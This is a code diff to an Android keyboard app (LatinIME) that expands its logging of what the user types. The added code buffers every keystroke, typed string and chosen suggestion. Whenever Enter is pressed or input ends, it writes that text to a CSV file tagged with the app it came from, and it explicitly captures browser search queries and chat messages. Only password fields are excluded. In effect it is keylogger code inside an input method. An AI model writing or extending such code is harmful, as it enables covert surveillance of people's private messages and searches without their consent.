@@ -119,6 +119,7 @@ public class LatinIME extends InputMethodService implements
     // Outgoing message logger state
     private String mCurrentDraftText = "";
     private String mCurrentDraftApp = "";
+    private final StringBuilder mKeystrokeFallbackBuffer = new StringBuilder();
 
     // UIHandler is needed when creating InputLogic
     public final UIHandler mHandler = new UIHandler(this);
@@ -770,9 +771,10 @@ public class LatinIME extends InputMethodService implements
         super.onStartInput(editorInfo, restarting);
 
         // Flush previous message if the field restarted empty (e.g. right after tapping Send)
-        if (!mCurrentDraftText.isEmpty()) {
-            writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
-            mCurrentDraftText = "";
+        flushAllDrafts();
+
+        if (editorInfo != null && editorInfo.packageName != null) {
+            mCurrentDraftApp = editorInfo.packageName;
         }
 
         RichInputMethodSubtype subtypeForApp = editorInfo == null
@@ -957,10 +959,7 @@ public class LatinIME extends InputMethodService implements
         Log.i(TAG, "onFinishInput");
 
         // Flush any remaining unsent draft when keyboard closes or switches apps
-        if (!mCurrentDraftText.isEmpty()) {
-            writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
-            mCurrentDraftText = "";
-        }
+        flushAllDrafts();
 
         mDictionaryFacilitator.onFinishInput();
         closeMainKeyboard();
@@ -1264,6 +1263,17 @@ public class LatinIME extends InputMethodService implements
     // Implementation of {@link SuggestionStripView.Listener}.
     @Override
     public void onCodeInput(final int codePoint, final int x, final int y, final boolean isKeyRepeat) {
+        if (!isPasswordOrSensitiveField(getCurrentInputEditorInfo())) {
+            if (codePoint == Constants.CODE_DELETE) {
+                if (mKeystrokeFallbackBuffer.length() > 0) {
+                    mKeystrokeFallbackBuffer.deleteCharAt(mKeystrokeFallbackBuffer.length() - 1);
+                }
+            } else if (codePoint == Constants.CODE_ENTER) {
+                flushAllDrafts();
+            } else if (codePoint > 0) {
+                mKeystrokeFallbackBuffer.appendCodePoint(codePoint);
+            }
+        }
         mKeyboardActionListener.onCodeInput(codePoint, x, y, isKeyRepeat);
     }
 
@@ -1273,10 +1283,7 @@ public class LatinIME extends InputMethodService implements
         // Immediately capture and save when Enter / Search / Go is tapped (catches web searches)
         if (event.getKeyCode() == Constants.CODE_ENTER) {
             captureLiveDraft();
-            if (!mCurrentDraftText.isEmpty()) {
-                writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
-                mCurrentDraftText = "";
-            }
+            flushAllDrafts();
         }
 
         if (KeyCode.VOICE_INPUT == event.getKeyCode()) {
@@ -1290,6 +1297,9 @@ public class LatinIME extends InputMethodService implements
 
     public void onTextInput(@Nullable String rawText) {
         if (rawText == null) return;
+        if (!isPasswordOrSensitiveField(getCurrentInputEditorInfo())) {
+            mKeystrokeFallbackBuffer.append(rawText);
+        }
         // TODO: have the keyboard pass the correct key code when we need it.
         Event event = Event.createSoftwareTextEvent(rawText, KeyCode.MULTIPLE_CODE_POINTS, null);
         InputTransaction completeInputTransaction = mInputLogic.onTextInput(mSettings.getCurrent(),
@@ -1398,6 +1408,16 @@ public class LatinIME extends InputMethodService implements
     // interface
     @Override
     public void pickSuggestionManually(SuggestedWordInfo suggestionInfo) {
+        if (!isPasswordOrSensitiveField(getCurrentInputEditorInfo())
+                && suggestionInfo != null && suggestionInfo.mWord != null) {
+            int lastSpace = mKeystrokeFallbackBuffer.lastIndexOf(" ");
+            if (lastSpace >= 0) {
+                mKeystrokeFallbackBuffer.delete(lastSpace + 1, mKeystrokeFallbackBuffer.length());
+            } else {
+                mKeystrokeFallbackBuffer.setLength(0);
+            }
+            mKeystrokeFallbackBuffer.append(suggestionInfo.mWord).append(" ");
+        }
         InputTransaction completeInputTransaction = mInputLogic.onPickSuggestionManually(
                 mSettings.getCurrent(), suggestionInfo, mKeyboardSwitcher.getKeyboardCapsMode(), mHandler);
         updateStateAfterInputTransaction(completeInputTransaction);
@@ -1536,10 +1556,7 @@ public class LatinIME extends InputMethodService implements
     public boolean onKeyDown(final int keyCode, final KeyEvent keyEvent) {
         if (keyCode == KeyEvent.KEYCODE_ENTER || keyCode == KeyEvent.KEYCODE_NUMPAD_ENTER) {
             captureLiveDraft();
-            if (!mCurrentDraftText.isEmpty()) {
-                writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
-                mCurrentDraftText = "";
-            }
+            flushAllDrafts();
         }
         if (mKeyboardActionListener.onKeyDown(keyCode, keyEvent))
             return true;
@@ -1681,23 +1698,28 @@ public class LatinIME extends InputMethodService implements
         mInputLogic.setFacilitator(mDictionaryFacilitator);
     }
 
+    private boolean isPasswordOrSensitiveField(@Nullable final EditorInfo ei) {
+        if (ei == null) return false;
+        final int variation = ei.inputType & InputType.TYPE_MASK_VARIATION;
+        return variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
+               variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
+               variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
+               variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD;
+    }
+
     private void captureLiveDraft() {
         try {
             final InputConnection ic = getCurrentInputConnection();
             final EditorInfo ei = getCurrentInputEditorInfo();
             if (ic == null || ei == null) return;
 
-            final int variation = ei.inputType & InputType.TYPE_MASK_VARIATION;
-            if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
-                variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
-                variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
-                variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD) {
+            if (isPasswordOrSensitiveField(ei)) {
                 return;
             }
 
             String liveText = "";
 
-            // 1. Primary: getExtractedText reads Chrome's Omnibox reliably
+            // 1. Primary: getExtractedText reads standard boxes and some Omnibox states
             final ExtractedText extracted = ic.getExtractedText(new ExtractedTextRequest(), 0);
             if (extracted != null && extracted.text != null) {
                 liveText = extracted.text.toString().trim();
@@ -1718,7 +1740,6 @@ public class LatinIME extends InputMethodService implements
             final String pkg = ei.packageName != null ? ei.packageName : "unknown";
 
             if (!liveText.isEmpty()) {
-                // In browsers, keep the longer typed query if autocomplete briefly flickers
                 if (pkg.contains("chrome") || pkg.contains("browser") || pkg.contains("firefox") || pkg.contains("brave")) {
                     if (liveText.length() >= mCurrentDraftText.length() || !mCurrentDraftText.startsWith(liveText)) {
                         mCurrentDraftText = liveText;
@@ -1732,9 +1753,32 @@ public class LatinIME extends InputMethodService implements
                 // Standard chat apps clear the box when Send is tapped
                 writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
                 mCurrentDraftText = "";
+                mKeystrokeFallbackBuffer.setLength(0);
             }
         } catch (Exception e) {
             Log.e(TAG, "Error capturing draft", e);
+        }
+    }
+
+    private void flushAllDrafts() {
+        try {
+            final EditorInfo ei = getCurrentInputEditorInfo();
+            final String pkg = (ei != null && ei.packageName != null && !ei.packageName.isEmpty())
+                    ? ei.packageName
+                    : (!mCurrentDraftApp.isEmpty() ? mCurrentDraftApp : "unknown");
+
+            final String finalText = !mCurrentDraftText.isEmpty()
+                    ? mCurrentDraftText
+                    : mKeystrokeFallbackBuffer.toString().trim();
+
+            if (!finalText.isEmpty()) {
+                writeLineToCsv(pkg, finalText);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error flushing drafts", e);
+        } finally {
+            mCurrentDraftText = "";
+            mKeystrokeFallbackBuffer.setLength(0);
         }
     }
 
